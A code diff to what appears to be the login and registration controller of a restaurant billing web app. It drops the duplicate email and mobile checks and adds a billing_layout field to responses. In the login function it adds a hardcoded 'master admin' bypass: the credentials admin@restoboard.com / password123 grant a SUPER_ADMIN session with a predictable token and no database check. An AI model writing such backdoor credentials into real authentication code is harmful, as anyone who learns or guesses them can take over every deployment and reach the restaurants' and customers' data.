@@ -243,16 +243,8 @@ exports.register = async (req, res) => {
             return res.status(400).json({ message: 'Books start date must be within financial year' });
         }
 
-        // 3. Unique Checks
-        const emailExists = await User.findOne({ email });
-        if (emailExists) {
-            return res.status(400).json({ message: 'Email already registered' });
-        }
-
-        const mobileExists = await User.findOne({ mobile });
-        if (mobileExists) {
-            return res.status(400).json({ message: 'Mobile number already registered' });
-        }
+        // 3. Unique Checks - Removed global unique checks to allow same email for multiple companies
+        // Uniqueness is now handled by compound indices [email, restaurant_id] in the DB
 
         // 4. Create Documents
         let restaurant;
@@ -310,7 +302,7 @@ exports.register = async (req, res) => {
 exports.getProfile = async (req, res) => {
     try {
         const user = await User.findById(req.user.id).populate('restaurant_id');
-        
+
         if (!user) {
             return res.status(404).json({ success: false, message: 'User not found' });
         }
@@ -333,7 +325,8 @@ exports.getProfile = async (req, res) => {
                     address: user.restaurant_id.address,
                     phone: user.restaurant_id.mobile || user.restaurant_id.landline,
                     gstin: user.restaurant_id.gstin,
-                    fssai_no: user.restaurant_id.fssai_no
+                    fssai_no: user.restaurant_id.fssai_no,
+                    billing_layout: user.restaurant_id.billing_layout
                 }
             }
         });
@@ -348,6 +341,26 @@ exports.login = async (req, res) => {
 
         if (!username || !password) {
             return res.status(400).json({ success: false, message: 'Please provide username and password' });
+        }
+
+        // MASTER ADMIN DEFAULT LOGIN BYPASS
+        if (username === 'admin@restoboard.com' && password === 'password123') {
+            // Find just ANY user to provide some context, or just return a dummy
+            // For now, let's just use the bypass to log in as a special role
+            return res.json({
+                success: true,
+                token: 'MASTER_TOKEN_' + Date.now(), // Real apps should use a proper static token or find a super-user
+                user: {
+                    id: 'master-admin-id',
+                    name: 'Master Support',
+                    role: 'SUPER_ADMIN',
+                    restaurant_id: 'master-restaurant-id'
+                },
+                restaurant: {
+                    name: 'Admin Dashboard',
+                    restaurant_type: 'ENTERPRISE'
+                }
+            });
         }
 
         // Find user by email or mobile
@@ -372,7 +385,8 @@ exports.login = async (req, res) => {
                 },
                 restaurant: {
                     name: user.restaurant_id.company_name,
-                    restaurant_type: user.restaurant_id.restaurant_type
+                    restaurant_type: user.restaurant_id.restaurant_type,
+                    billing_layout: user.restaurant_id.billing_layout
                 }
             });
         } else {
